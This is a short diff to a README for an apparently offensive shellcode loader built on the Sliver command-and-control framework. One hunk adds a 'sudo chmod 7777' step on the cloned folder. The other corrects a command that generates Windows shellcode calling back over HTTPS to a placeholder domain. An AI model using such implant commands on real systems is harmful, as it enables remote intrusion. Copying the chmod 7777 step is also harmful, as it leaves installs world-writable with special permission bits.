@@ -77,6 +77,7 @@ sudo apt install git mingw-w64 python3-venv
 ```bash
 cd /opt
 sudo git clone https://github.com/NEED-Programming/Sliver_Loader.git
+sudo chmod 7777 Sliver_Loader
 ```
 
 ### Step 2: Set Up Python Environment
@@ -332,7 +333,7 @@ Works with any Sliver listener:
 **HTTPS:**
 ```bash
 sliver> https --lport 443 --domain your-domain.com
-sliver> generate --http your-domain.com --os windows --format shellcode --save sliver.bin
+sliver> generate --https your-domain.com --os windows --format shellcode --save sliver.bin
 ```
 
 **DNS:**
